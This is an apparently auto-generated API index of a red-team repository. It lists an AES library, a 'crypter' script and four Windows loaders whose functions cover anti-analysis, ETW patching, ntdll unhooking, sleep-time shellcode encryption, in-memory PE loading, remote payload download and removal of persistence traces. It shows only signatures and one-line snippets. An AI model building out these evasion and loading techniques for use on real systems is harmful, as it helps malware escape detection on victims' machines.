# API

## aes.c

### getSBoxValue (function) `static uint8_t getSBoxValue(uint8_t num)`
- Defined: `aes.c:12`
- Doc: define KEYLEN_256 32 define RKLENGTH (4 * (Nr + 1)) define BLOCKLEN 16
- Depends on: `aes.h`

### getSBoxInvert (function) `static uint8_t getSBoxInvert(uint8_t num)`
- Defined: `aes.c:34`
- Depends on: `aes.h`

### Td0 (function) `static uint8_t Td0(int x)`
- Defined: `aes.c:56`
- Depends on: `aes.h`

### Td1 (function) `static uint8_t Td1(int x)`
- Defined: `aes.c:58`
- Depends on: `aes.h`

### Td2 (function) `static uint8_t Td2(int x)`
- Defined: `aes.c:59`
- Depends on: `aes.h`

### Td3 (function) `static uint8_t Td3(int x)`
- Defined: `aes.c:60`
- Depends on: `aes.h`

### Td4 (function) `static uint8_t Td4(int x)`
- Defined: `aes.c:61`
- Depends on: `aes.h`

### KeyExpansion (function) `static void KeyExpansion(uint8_t* RoundKey, const uint8_t* Key)`
- Defined: `aes.c:166`
- Doc: This function produces Nb(Nr+1) round keys. The round keys are used in each round to decrypt the states.
- Depends on: `aes.h`

### AES_init_ctx (function) `void AES_init_ctx(struct AES_ctx* ctx, const uint8_t* key)`
- Defined: `aes.c:238`
- Depends on: `aes.h`

### AES_init_ctx_iv (function) `void AES_init_ctx_iv(struct AES_ctx* ctx, const uint8_t* key, const uint8_t* iv)`
- Defined: `aes.c:244`
- Doc: if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1))
- Depends on: `aes.h`

### AES_ctx_set_iv (function) `void AES_ctx_set_iv(struct AES_ctx* ctx, const uint8_t* iv)`
- Defined: `aes.c:249`
- Depends on: `aes.h`

### AddRoundKey (function) `static void AddRoundKey(uint8_t round, state_t* state, const uint8_t* RoundKey)`
- Defined: `aes.c:257`
- Doc: This function adds the round key to state. The round key is added to the state by an XOR function.
- Depends on: `aes.h`

### SubBytes (function) `static void SubBytes(state_t* state)`
- Defined: `aes.c:271`
- Doc: The SubBytes Function Substitutes the values in the state matrix with values in an S-box.
- Depends on: `aes.h`

### ShiftRows (function) `static void ShiftRows(state_t* state)`
- Defined: `aes.c:286`
- Doc: The ShiftRows() function shifts the rows in the state to the left. Each row is shifted with different offset. Offset = R
- Depends on: `aes.h`

### xtime (function) `static uint8_t xtime(uint8_t x)`
- Defined: `aes.c:313`
- Depends on: `aes.h`

### MixColumns (function) `static void MixColumns(state_t* state)`
- Defined: `aes.c:320`
- Doc: MixColumns function mixes the columns of the state matrix
- Depends on: `aes.h`

### Multiply (function) `static uint8_t Multiply(uint8_t x, uint8_t y)`
- Defined: `aes.c:340`
- Doc: Multiply is used to multiply numbers in the field GF(2^8) Note: The last call to xtime() is unneeded, but often ends up 
- Depends on: `aes.h`

### InvMixColumns (function) `static void InvMixColumns(state_t* state)`
- Defined: `aes.c:370`
- Doc: MixColumns function mixes the columns of the state matrix. The method used to multiply may be difficult to understand fo
- Depends on: `aes.h`

### InvSubBytes (function) `static void InvSubBytes(state_t* state)`
- Defined: `aes.c:391`
- Doc: The SubBytes Function Substitutes the values in the state matrix with values in an S-box.
- Depends on: `aes.h`

### InvShiftRows (function) `static void InvShiftRows(state_t* state)`
- Defined: `aes.c:402`
- Depends on: `aes.h`

### Cipher (function) `static void Cipher(state_t* state, const uint8_t* RoundKey)`
- Defined: `aes.c:433`
- Doc: Cipher is the main function that encrypts the PlainText.
- Depends on: `aes.h`

### InvCipher (function) `static void InvCipher(state_t* state, const uint8_t* RoundKey)`
- Defined: `aes.c:459`
- Doc: if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1)
- Depends on: `aes.h`

### AES_ECB_encrypt (function) `void AES_ECB_encrypt(const struct AES_ctx* ctx, uint8_t* buf)`
- Defined: `aes.c:488`
- Doc: AddRoundKey(round, state, RoundKey); if (round == 0) { break; } InvMixColumns(state); } } #endif // #if (defined(CBC) &&
- Depends on: `aes.h`

### AES_ECB_decrypt (function) `void AES_ECB_decrypt(const struct AES_ctx* ctx, uint8_t* buf)`
- Defined: `aes.c:495`
- Depends on: `aes.h`

### XorWithIv (function) `static void XorWithIv(uint8_t* buf, const uint8_t* Iv)`
- Defined: `aes.c:510`
- Doc: if defined(CBC) && (CBC == 1)
- Depends on: `aes.h`

### AES_CBC_encrypt_buffer (function) `void AES_CBC_encrypt_buffer(struct AES_ctx *ctx, uint8_t* buf, size_t length)`
- Defined: `aes.c:520`
- Depends on: `aes.h`

### AES_CBC_decrypt_buffer (function) `void AES_CBC_decrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length)`
- Defined: `aes.c:535`
- Depends on: `aes.h`

### AES_CTR_xcrypt_buffer (function) `void AES_CTR_xcrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length)`
- Defined: `aes.c:558`
- Doc: XorWithIv(buf, ctx->Iv); memcpy(ctx->Iv, storeNextIv, AES_BLOCKLEN); buf += AES_BLOCKLEN; } } #endif // #if defined(CBC)
- Depends on: `aes.h`

### memcpy (function) `memcpy (ctx->Iv, iv, AES_BLOCKLEN);`
- Defined: `aes.c:247`
- Depends on: `aes.h`

## aes.h

### AES_init_ctx (function) `void AES_init_ctx(struct AES_ctx* ctx, const uint8_t* key);`
- Defined: `aes.h:40`
- Imported by: `aes.c`

### AES_init_ctx_iv (function) `void AES_init_ctx_iv(struct AES_ctx* ctx, const uint8_t* key, const uint8_t* iv);`
- Defined: `aes.h:43`
- Doc: if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1))
- Imported by: `aes.c`

### AES_ctx_set_iv (function) `void AES_ctx_set_iv(struct AES_ctx* ctx, const uint8_t* iv);`
- Defined: `aes.h:44`
- Imported by: `aes.c`

### AES_ECB_encrypt (function) `void AES_ECB_encrypt(const struct AES_ctx* ctx, uint8_t* buf);`
- Defined: `aes.h:48`
- Doc: if defined(ECB) && (ECB == 1)
- Imported by: `aes.c`

### AES_ECB_decrypt (function) `void AES_ECB_decrypt(const struct AES_ctx* ctx, uint8_t* buf);`
- Defined: `aes.h:49`
- Imported by: `aes.c`

### AES_CBC_encrypt_buffer (function) `void AES_CBC_encrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);`
- Defined: `aes.h:53`
- Doc: if defined(CBC) && (CBC == 1)
- Imported by: `aes.c`

### AES_CBC_decrypt_buffer (function) `void AES_CBC_decrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);`
- Defined: `aes.h:54`
- Imported by: `aes.c`

### AES_CTR_xcrypt_buffer (function) `void AES_CTR_xcrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);`
- Defined: `aes.h:58`
- Doc: if defined(CTR) && (CTR == 1)
- Imported by: `aes.c`

## crypter.py

### AESencrypt (function) `def AESencrypt(plaintext, key)`
- Defined: `crypter.py:9`

### change_ext (function) `def change_ext(filename, new_ext)`
- Defined: `crypter.py:19`
- Doc: Reemplaza la extensión del archivo por una nueva (sin el punto).

### main (function) `def main()`
- Defined: `crypter.py:24`

## loader.c

### read_bit (function) `static int read_bit(BitReader* br)`
- Defined: `loader.c:63`

### read_bits (function) `static int read_bits(BitReader* br, int n)`
- Defined: `loader.c:74`

### lzss_decode_mem (function) `BOOL lzss_decode_mem(const unsigned char* input, size_t input_size, unsigned char** output, size_...`
- Defined: `loader.c:84`

### hookGetCommandLineW (function) `LPWSTR hookGetCommandLineW()`
- Defined: `loader.c:217`
- Doc: Implementación de hooks

### hookGetCommandLineA (function) `LPSTR hookGetCommandLineA()`
- Defined: `loader.c:218`

### hook__p___argv (function) `char*** __cdecl hook__p___argv(void)`
- Defined: `loader.c:219`

### hook__p___wargv (function) `wchar_t*** __cdecl hook__p___wargv(void)`
- Defined: `loader.c:220`

### hook__p___argc (function) `int* __cdecl hook__p___argc(void)`
- Defined: `loader.c:221`

### anti_analysis (function) `BOOL anti_analysis()`
- Defined: `loader.c:226`
- Doc: === ANTI-ANALYSIS ===

### selfDestruct (function) `void selfDestruct()`
- Defined: `loader.c:251`
- Doc: Puff

### hook__wgetmainargs (function) `int hook__wgetmainargs(int* _Argc, wchar_t*** _Argv, wchar_t*** _Env, int _useless_, void* _useless)`
- Defined: `loader.c:306`

### hook__getmainargs (function) `int hook__getmainargs(int* _Argc, char*** _Argv, char*** _Env, int _useless_, void* _useless)`
- Defined: `loader.c:312`

### hookexit (function) `int __cdecl hookexit(int status)`
- Defined: `loader.c:318`

### hookExitProcess (function) `void __stdcall hookExitProcess(UINT statuscode)`
- Defined: `loader.c:323`

### masqueradeCmdline (function) `void masqueradeCmdline()`
- Defined: `loader.c:327`

### freeargvA (function) `void freeargvA(char** array, int Argc)`
- Defined: `loader.c:365`

### freeargvW (function) `void freeargvW(wchar_t** array, int Argc)`
- Defined: `loader.c:373`

### GetNTHeaders (function) `char* GetNTHeaders(char* pe_buffer)`
- Defined: `loader.c:381`

### GetPEDirectory (function) `IMAGE_DATA_DIRECTORY* GetPEDirectory(PVOID pe_buffer, size_t dir_id)`
- Defined: `loader.c:393`

### RepairIAT (function) `BOOL RepairIAT(PVOID modulePtr)`
- Defined: `loader.c:403`

### _stricmp (function) `_stricmp(func_name, "exit") == 0 ||
                    _stricmp(func_name, "_Exit") == 0 ||
    ...`
- Defined: `loader.c:458`

### RunPE (function) `DWORD WINAPI RunPE(LPVOID lpParameter)`
- Defined: `loader.c:478`

### PELoader (function) `void PELoader(char* data, DWORD datasize)`
- Defined: `loader.c:484`

### getNtdll (function) `LPVOID getNtdll()`
- Defined: `loader.c:558`

### Unhook (function) `BOOL Unhook(LPVOID cleanNtdll)`
- Defined: `loader.c:601`

### DecryptAES (function) `void DecryptAES(char* data, DWORD* pDataLen, char* key, DWORD keyLen)`
- Defined: `loader.c:637`

### GetData (function) `DATA GetData(wchar_t* whost, DWORD port, wchar_t* wresource)`
- Defined: `loader.c:670`

### main (function) `int main(int argc, char** argv)`
- Defined: `loader.c:791`

### free (function) `free(window);`
- Defined: `loader.c:109`

### RegCloseKey (function) `RegCloseKey(hKey);`
- Defined: `loader.c:235`

### printf (function) `printf("[*] Initiating self-destruct...\n");`
- Defined: `loader.c:252`

### fflush (function) `fflush(stdout);`
- Defined: `loader.c:253`

### RegDeleteValueA (function) `RegDeleteValueA(hKey, "SystemMaintenance");`
- Defined: `loader.c:266`

### system (function) `system("schtasks /delete /tn \"SystemMaintenanceTask\" /f > nul 2>&1");`
- Defined: `loader.c:271`
- Doc: Eliminar tarea programada

### CloseHandle (function) `CloseHandle(pi.hThread);`
- Defined: `loader.c:295`

### ExitProcess (function) `ExitProcess(0);`
- Defined: `loader.c:303`

### ExitThread (function) `ExitThread(0);`
- Defined: `loader.c:320`

### MultiByteToWideChar (function) `MultiByteToWideChar(CP_UTF8, 0, sz_masqCmd_Ansi, -1, sz_masqCmd_Widh, required_size);`
- Defined: `loader.c:332`

### LocalFree (function) `LocalFree(poi_masqArgvW);`
- Defined: `loader.c:349`

### entryPoint (function) `entryPoint();`
- Defined: `loader.c:481`

### NTSTATUS (function) `typedef NTSTATUS (NTAPI *NtUnmapViewOfSection_t)(HANDLE, PVOID);`
- Defined: `loader.c:501`

### NtUnmapViewOfSection (function) `NtUnmapViewOfSection(NtCurrentProcess(), preferAddr);`
- Defined: `loader.c:504`

### memcpy (function) `memcpy(pImageBase, data, ntHeader->OptionalHeader.SizeOfHeaders);`
- Defined: `loader.c:518`

### VirtualFree (function) `VirtualFree(pImageBase, 0, MEM_RELEASE);`
- Defined: `loader.c:524`

### WaitForSingleObject (function) `WaitForSingleObject(hThread, INFINITE);`
- Defined: `loader.c:550`

### ep (function) `ep();`
- Defined: `loader.c:555`

### TerminateProcess (function) `TerminateProcess(pi.hProcess, 0);`
- Defined: `loader.c:572`

### CryptSetKeyParam (function) `CryptSetKeyParam(hKey, KP_IV, iv, 0);`
- Defined: `loader.c:657`

### WideCharToMultiByte (function) `WideCharToMultiByte(CP_UTF8, 0, wresource, -1, resourceA, sizeof(resourceA)-1, NULL, NULL);`
- Defined: `loader.c:679`

### wprintf (function) `wprintf(L"[*] Downloading: %s (%s)\n", wresource, resourceA);`
- Defined: `loader.c:680`

### WinHttpCloseHandle (function) `WinHttpCloseHandle(hSession);`
- Defined: `loader.c:692`

### WinHttpSetOption (function) `WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &sec_flags, sizeof(sec_flags));`
- Defined: `loader.c:723`

### ZeroMemory (function) `ZeroMemory(pszOutBuffer, dwSize + 1);`
- Defined: `loader.c:747`

### srand (function) `srand(GetTickCount());`
- Defined: `loader.c:793`

### Sleep (function) `Sleep(3000);`
- Defined: `loader.c:860`

## loader2.c

### read_bit (function) `static int read_bit(BitReader* br)`
- Defined: `loader2.c:51`

### read_bits (function) `static int read_bits(BitReader* br, int n)`
- Defined: `loader2.c:60`

### DecryptAES (function) `void DecryptAES(char* data, DWORD* pDataLen, char* key, DWORD keyLen)`
- Defined: `loader2.c:70`

### get_return_address (function) `static inline UPTR get_return_address(void)`
- Defined: `loader2.c:182`
- Doc: ================== FLUCTUATION IMPLEMENTATION ==================

### xor32 (function) `void xor32(uint8_t *buf, SIZE_T sz, uint32_t key)`
- Defined: `loader2.c:186`

### isShellcodeThread (function) `bool isShellcodeThread(LPVOID addr)`
- Defined: `loader2.c:195`
- Doc: Verifica si la dirección está dentro de .text

### shellcodeEncryptDecrypt (function) `void shellcodeEncryptDecrypt(LPVOID caller)`
- Defined: `loader2.c:206`
- Doc: Fluctuación: encripta/desencripta SOLO .text

### MySleep (function) `static void WINAPI MySleep(DWORD ms)`
- Defined: `loader2.c:246`
- Doc: Hook de Sleep: ya NO inicializa fluctuación (se hace en PELoader)

### fastTrampoline (function) `bool fastTrampoline(bool install, BYTE *target, LPVOID jump, HookTrampolineBuffers *b)`
- Defined: `loader2.c:261`

### VEHHandler (function) `LONG NTAPI VEHHandler(PEXCEPTION_POINTERS xp)`
- Defined: `loader2.c:302`

### lzss_decode_mem (function) `BOOL lzss_decode_mem(const unsigned char* input, size_t input_size, unsigned char** output, size_...`
- Defined: `loader2.c:323`
- Doc: ================== LZSS ==================

### masqueradeCmdline (function) `void masqueradeCmdline()`
- Defined: `loader2.c:387`
- Doc: ================== PE LOADER ==================

### GetNTHeaders (function) `char* GetNTHeaders(char* pe_buffer)`
- Defined: `loader2.c:418`

### GetPEDirectory (function) `IMAGE_DATA_DIRECTORY* GetPEDirectory(PVOID pe_buffer, size_t dir_id)`
- Defined: `loader2.c:429`

### RepairIAT (function) `BOOL RepairIAT(PVOID modulePtr)`
- Defined: `loader2.c:438`

### hookGetCommandLineA (function) `LPSTR hookGetCommandLineA()`
- Defined: `loader2.c:490`
- Doc: Hooks

### hookGetCommandLineW (function) `LPWSTR hookGetCommandLineW()`
- Defined: `loader2.c:491`

### hook__p___argv (function) `char*** __cdecl hook__p___argv(void)`
- Defined: `loader2.c:492`

### hook__p___wargv (function) `wchar_t*** __cdecl hook__p___wargv(void)`
- Defined: `loader2.c:493`

### hook__p___argc (function) `int* __cdecl hook__p___argc(void)`
- Defined: `loader2.c:494`

### hook__getmainargs (function) `int hook__getmainargs(int* _Argc, char*** _Argv, char*** _Env, int _useless_, void* _useless)`
- Defined: `loader2.c:495`

### hook__wgetmainargs (function) `int hook__wgetmainargs(int* _Argc, wchar_t*** _Argv, wchar_t*** _Env, int _useless_, void* _useless)`
- Defined: `loader2.c:498`

### hookExitProcess (function) `void __stdcall hookExitProcess(UINT statuscode)`
- Defined: `loader2.c:501`

### RunPE (function) `DWORD WINAPI RunPE(LPVOID lpParameter)`
- Defined: `loader2.c:502`

### PELoader (function) `void PELoader(char* data, DWORD datasize)`
- Defined: `loader2.c:508`

### anti_analysis (function) `BOOL anti_analysis()`
- Defined: `loader2.c:596`
- Doc: ================== ANTI-ANALYSIS & CLEANUP ==================

### selfDestruct (function) `void selfDestruct()`
- Defined: `loader2.c:617`

### GetData (function) `DATA GetData(wchar_t* whost, DWORD port, wchar_t* wresource)`
- Defined: `loader2.c:646`

### main (function) `int main(int argc, char** argv)`
- Defined: `loader2.c:731`
- Doc: ================== MAIN ==================

### CryptSetKeyParam (function) `CryptSetKeyParam(hKey, KP_IV, iv, 0);`
- Defined: `loader2.c:84`

### printf (function) `printf("[-] CryptDecrypt failed: %u\n", GetLastError());`
- Defined: `loader2.c:87`

### void (function) `typedef void (WINAPI *typeSleep)(DWORD ms);`
- Defined: `loader2.c:125`

### DWORD (function) `typedef DWORD (NTAPI *typeNtFlushInstructionCache)(HANDLE, PVOID, ULONG);`
- Defined: `loader2.c:127`

### freeargvA (function) `void freeargvA(char** array, int Argc);`
- Defined: `loader2.c:169`

### freeargvW (function) `void freeargvW(wchar_t** array, int Argc);`
- Defined: `loader2.c:170`

### VirtualProtect (function) `VirtualProtect(g_fluctuationData.shellcodeAddr, g_fluctuationData.shellcodeSize, PAGE_READWRITE, &old);`
- Defined: `loader2.c:218`

### log (function) `log("[>] Flipped to RW");`
- Defined: `loader2.c:222`

### Sleep (function) `Sleep(ms);`
- Defined: `loader2.c:256`

### memcpy (function) `memcpy(code + 2, &jump, 8);`
- Defined: `loader2.c:271`

### GetProcAddress (function) `GetProcAddress(GetModuleHandleA("ntdll"), "NtFlushInstructionCache");`
- Defined: `loader2.c:296`

### free (function) `free(window);`
- Defined: `loader2.c:379`

### MultiByteToWideChar (function) `MultiByteToWideChar(CP_UTF8, 0, sz_masqCmd_Ansi, -1, sz_masqCmd_Widh, required_size);`
- Defined: `loader2.c:393`

### LocalFree (function) `LocalFree(poi_masqArgvW);`
- Defined: `loader2.c:404`

### entryPoint (function) `entryPoint();`
- Defined: `loader2.c:505`

### NTSTATUS (function) `typedef NTSTATUS (NTAPI *NtUnmapViewOfSection_t)(HANDLE, PVOID);`
- Defined: `loader2.c:518`

### VirtualFree (function) `VirtualFree(pImageBase, 0, MEM_RELEASE);`
- Defined: `loader2.c:536`

### WaitForSingleObject (function) `WaitForSingleObject(hThread, INFINITE);`
- Defined: `loader2.c:588`

### CloseHandle (function) `CloseHandle(hThread);`
- Defined: `loader2.c:589`

### RegCloseKey (function) `RegCloseKey(hKey);`
- Defined: `loader2.c:605`

### GlobalMemoryStatusEx (function) `GlobalMemoryStatusEx(&mem);`
- Defined: `loader2.c:613`

### RegDeleteValueA (function) `RegDeleteValueA(hKey, "SystemMaintenance");`
- Defined: `loader2.c:625`

### system (function) `system("schtasks /delete /tn \"SystemMaintenanceTask\" /f > nul 2>&1");`
- Defined: `loader2.c:628`

### ExitProcess (function) `ExitProcess(0);`
- Defined: `loader2.c:644`

### WideCharToMultiByte (function) `WideCharToMultiByte(CP_UTF8, 0, wresource, -1, resourceA, sizeof(resourceA)-1, NULL, NULL);`
- Defined: `loader2.c:654`

### wprintf (function) `wprintf(L"[*] Downloading: %s (%s)\n", wresource, resourceA);`
- Defined: `loader2.c:655`

### WinHttpSetOption (function) `WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &sec_flags, sizeof(sec_flags));`
- Defined: `loader2.c:672`

### WinHttpCloseHandle (function) `WinHttpCloseHandle(hRequest);`
- Defined: `loader2.c:677`

### ZeroMemory (function) `ZeroMemory(pszOutBuffer, dwSize + 1);`
- Defined: `loader2.c:691`

### srand (function) `srand(GetTickCount());`
- Defined: `loader2.c:733`

### AddVectoredExceptionHandler (function) `AddVectoredExceptionHandler(1, VEHHandler);`
- Defined: `loader2.c:760`

## loader3.c

### read_bit (function) `static int read_bit(BitReader* br)`
- Defined: `loader3.c:63`

### read_bits (function) `static int read_bits(BitReader* br, int n)`
- Defined: `loader3.c:72`

### lzss_decode_mem (function) `BOOL lzss_decode_mem(const unsigned char* input, size_t input_size, unsigned char** output, size_...`
- Defined: `loader3.c:82`

### DecryptAES (function) `void DecryptAES(char* data, DWORD* pDataLen, char* key, DWORD keyLen)`
- Defined: `loader3.c:138`

### get_return_address (function) `static inline UPTR get_return_address(void)`
- Defined: `loader3.c:238`
- Doc: ================== FLUCTUATION IMPLEMENTATION ==================

### xor32 (function) `void xor32(uint8_t *buf, SIZE_T sz, uint32_t key)`
- Defined: `loader3.c:241`

### isShellcodeThread (function) `bool isShellcodeThread(LPVOID addr)`
- Defined: `loader3.c:248`

### shellcodeEncryptDecrypt (function) `void shellcodeEncryptDecrypt(LPVOID caller)`
- Defined: `loader3.c:257`

### MySleep (function) `static void WINAPI MySleep(DWORD ms)`
- Defined: `loader3.c:291`

### fastTrampoline (function) `bool fastTrampoline(bool install, BYTE *target, LPVOID jump, HookTrampolineBuffers *b)`
- Defined: `loader3.c:305`

### VEHHandler (function) `LONG NTAPI VEHHandler(PEXCEPTION_POINTERS xp)`
- Defined: `loader3.c:341`

### masqueradeCmdline (function) `void masqueradeCmdline()`
- Defined: `loader3.c:360`
- Doc: ================== PE LOADER ==================

### freeargvA (function) `void freeargvA(char** array, int Argc)`
- Defined: `loader3.c:389`

### freeargvW (function) `void freeargvW(wchar_t** array, int Argc)`
- Defined: `loader3.c:397`

### GetNTHeaders (function) `char* GetNTHeaders(char* pe_buffer)`
- Defined: `loader3.c:405`

### GetPEDirectory (function) `IMAGE_DATA_DIRECTORY* GetPEDirectory(PVOID pe_buffer, size_t dir_id)`
- Defined: `loader3.c:416`

### RepairIAT (function) `BOOL RepairIAT(PVOID modulePtr)`
- Defined: `loader3.c:425`

### hookGetCommandLineA (function) `LPSTR hookGetCommandLineA()`
- Defined: `loader3.c:478`
- Doc: Hooks

### hookGetCommandLineW (function) `LPWSTR hookGetCommandLineW()`
- Defined: `loader3.c:479`

### hook__p___argv (function) `char*** __cdecl hook__p___argv(void)`
- Defined: `loader3.c:480`

### hook__p___wargv (function) `wchar_t*** __cdecl hook__p___wargv(void)`
- Defined: `loader3.c:481`

### hook__p___argc (function) `int* __cdecl hook__p___argc(void)`
- Defined: `loader3.c:482`

### hook__getmainargs (function) `int hook__getmainargs(int* _Argc, char*** _Argv, char*** _Env, int _useless_, void* _useless)`
- Defined: `loader3.c:483`

### hook__wgetmainargs (function) `int hook__wgetmainargs(int* _Argc, wchar_t*** _Argv, wchar_t*** _Env, int _useless_, void* _useless)`
- Defined: `loader3.c:486`

### hookexit (function) `int __cdecl hookexit(int status)`
- Defined: `loader3.c:489`

### hookExitProcess (function) `void __stdcall hookExitProcess(UINT statuscode)`
- Defined: `loader3.c:493`

### RunPE (function) `DWORD WINAPI RunPE(LPVOID lpParameter)`
- Defined: `loader3.c:496`

### PELoader (function) `void PELoader(char* data, DWORD datasize)`
- Defined: `loader3.c:502`

### anti_analysis (function) `BOOL anti_analysis()`
- Defined: `loader3.c:581`
- Doc: ================== ANTI-ANALYSIS & CLEANUP ==================

### selfDestruct (function) `void selfDestruct()`
- Defined: `loader3.c:601`

### getNtdll (function) `LPVOID getNtdll()`
- Defined: `loader3.c:629`
- Doc: ================== UNHOOKING ==================

### Unhook (function) `BOOL Unhook(LPVOID cleanNtdll)`
- Defined: `loader3.c:664`

### GetData (function) `DATA GetData(wchar_t* whost, DWORD port, wchar_t* wresource)`
- Defined: `loader3.c:689`
- Doc: ================== NETWORK ==================

### main (function) `int main(int argc, char** argv)`
- Defined: `loader3.c:757`
- Doc: ================== MAIN ==================

### Copyright (function) `Copyright (c) LazyOwn RedTeam 2025. All rights reserved. */ #define _CRT_RAND_S #define WIN32_LEAN_AND_MEAN #include <windows.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <st`
- Defined: `loader3.c:13`

### free (function) `free(window);`
- Defined: `loader3.c:133`

### CryptSetKeyParam (function) `CryptSetKeyParam(hKey, KP_IV, iv, 0);`
- Defined: `loader3.c:150`

### printf (function) `printf("[-] CryptDecrypt failed: %u\n", GetLastError());`
- Defined: `loader3.c:152`

### void (function) `typedef void (WINAPI *typeSleep)(DWORD ms);`
- Defined: `loader3.c:188`

### DWORD (function) `typedef DWORD (NTAPI *typeNtFlushInstructionCache)(HANDLE, PVOID, ULONG);`
- Defined: `loader3.c:190`

### VirtualProtect (function) `VirtualProtect(g_fluctuationData.shellcodeAddr, g_fluctuationData.shellcodeSize, PAGE_READWRITE, &old);`
- Defined: `loader3.c:268`

### log (function) `log("[>] Flipped to RW");`
- Defined: `loader3.c:272`

### Sleep (function) `Sleep(ms);`
- Defined: `loader3.c:300`

### memcpy (function) `memcpy(code + 2, &jump, 8);`
- Defined: `loader3.c:314`

### GetProcAddress (function) `GetProcAddress(GetModuleHandleA("ntdll"), "NtFlushInstructionCache");`
- Defined: `loader3.c:336`

### MultiByteToWideChar (function) `MultiByteToWideChar(CP_UTF8, 0, sz_masqCmd_Ansi, -1, sz_masqCmd_Widh, required_size);`
- Defined: `loader3.c:365`

### LocalFree (function) `LocalFree(poi_masqArgvW);`
- Defined: `loader3.c:375`

### ExitThread (function) `ExitThread(0);`
- Defined: `loader3.c:490`

### entryPoint (function) `entryPoint();`
- Defined: `loader3.c:499`

### NTSTATUS (function) `typedef NTSTATUS (NTAPI *NtUnmapViewOfSection_t)(HANDLE, PVOID);`
- Defined: `loader3.c:511`

### VirtualFree (function) `VirtualFree(pImageBase, 0, MEM_RELEASE);`
- Defined: `loader3.c:526`

### WaitForSingleObject (function) `WaitForSingleObject(hThread, INFINITE);`
- Defined: `loader3.c:573`

### CloseHandle (function) `CloseHandle(hThread);`
- Defined: `loader3.c:574`

### RegCloseKey (function) `RegCloseKey(hKey);`
- Defined: `loader3.c:589`

### GlobalMemoryStatusEx (function) `GlobalMemoryStatusEx(&mem);`
- Defined: `loader3.c:597`

### RegDeleteValueA (function) `RegDeleteValueA(hKey, "SystemMaintenance");`
- Defined: `loader3.c:608`

### system (function) `system("schtasks /delete /tn \"SystemMaintenanceTask\" /f > nul 2>&1");`
- Defined: `loader3.c:611`

### ExitProcess (function) `ExitProcess(0);`
- Defined: `loader3.c:625`

### TerminateProcess (function) `TerminateProcess(pi.hProcess, 0);`
- Defined: `loader3.c:639`

### WideCharToMultiByte (function) `WideCharToMultiByte(CP_UTF8, 0, wresource, -1, resourceA, sizeof(resourceA)-1, NULL, NULL);`
- Defined: `loader3.c:695`

### wprintf (function) `wprintf(L"[*] Downloading: %s (%s)\n", wresource, resourceA);`
- Defined: `loader3.c:696`

### WinHttpSetOption (function) `WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &sec_flags, sizeof(sec_flags));`
- Defined: `loader3.c:708`

### WinHttpCloseHandle (function) `WinHttpCloseHandle(hRequest);`
- Defined: `loader3.c:712`

### ZeroMemory (function) `ZeroMemory(pszOutBuffer, dwSize + 1);`
- Defined: `loader3.c:724`

### srand (function) `srand(GetTickCount());`
- Defined: `loader3.c:758`

### AddVectoredExceptionHandler (function) `AddVectoredExceptionHandler(1, VEHHandler);`
- Defined: `loader3.c:792`

## loader4.c

### read_bit (function) `static int read_bit(BitReader* br)`
- Defined: `loader4.c:103`

### read_bits (function) `static int read_bits(BitReader* br, int n)`
- Defined: `loader4.c:112`

### deobf (function) `void deobf(const char* src, char* dst, size_t max_len)`
- Defined: `loader4.c:124`
- Doc: Helper para desofuscar

### SetHWBP_NtContinue (function) `BOOL SetHWBP_NtContinue(PVOID targetAddr, DWORD index)`
- Defined: `loader4.c:132`

### lzss_decode_mem (function) `BOOL lzss_decode_mem(const unsigned char* input, size_t input_size, unsigned char** output, size_...`
- Defined: `loader4.c:161`

### PatchETW (function) `BOOL PatchETW()`
- Defined: `loader4.c:218`

### DecryptAES (function) `void DecryptAES(char* data, DWORD* pDataLen, char* key, DWORD keyLen)`
- Defined: `loader4.c:250`

### get_return_address (function) `static inline UPTR get_return_address(void)`
- Defined: `loader4.c:351`
- Doc: ================== FLUCTUATION IMPLEMENTATION ==================

### xor32 (function) `void xor32(uint8_t *buf, SIZE_T sz, uint32_t key)`
- Defined: `loader4.c:354`

### isShellcodeThread (function) `bool isShellcodeThread(LPVOID addr)`
- Defined: `loader4.c:361`

### shellcodeEncryptDecrypt (function) `void shellcodeEncryptDecrypt(LPVOID caller)`
- Defined: `loader4.c:370`

### MySleep (function) `static void WINAPI MySleep(DWORD ms)`
- Defined: `loader4.c:404`

### fastTrampoline (function) `bool fastTrampoline(bool install, BYTE *target, LPVOID jump, HookTrampolineBuffers *b)`
- Defined: `loader4.c:418`

### VEHHandler (function) `LONG NTAPI VEHHandler(PEXCEPTION_POINTERS xp)`
- Defined: `loader4.c:457`

### masqueradeCmdline (function) `void masqueradeCmdline()`
- Defined: `loader4.c:476`
- Doc: ================== PE LOADER ==================

### freeargvA (function) `void freeargvA(char** array, int Argc)`
- Defined: `loader4.c:505`

### freeargvW (function) `void freeargvW(wchar_t** array, int Argc)`
- Defined: `loader4.c:513`

### GetNTHeaders (function) `char* GetNTHeaders(char* pe_buffer)`
- Defined: `loader4.c:521`

### GetPEDirectory (function) `IMAGE_DATA_DIRECTORY* GetPEDirectory(PVOID pe_buffer, size_t dir_id)`
- Defined: `loader4.c:532`

### RepairIAT (function) `BOOL RepairIAT(PVOID modulePtr)`
- Defined: `loader4.c:541`

### hookGetCommandLineA (function) `LPSTR hookGetCommandLineA()`
- Defined: `loader4.c:594`
- Doc: Hooks

### hookGetCommandLineW (function) `LPWSTR hookGetCommandLineW()`
- Defined: `loader4.c:595`

### hook__p___argv (function) `char*** __cdecl hook__p___argv(void)`
- Defined: `loader4.c:596`

### hook__p___wargv (function) `wchar_t*** __cdecl hook__p___wargv(void)`
- Defined: `loader4.c:597`

### hook__p___argc (function) `int* __cdecl hook__p___argc(void)`
- Defined: `loader4.c:598`

### hook__getmainargs (function) `int hook__getmainargs(int* _Argc, char*** _Argv, char*** _Env, int _useless_, void* _useless)`
- Defined: `loader4.c:599`

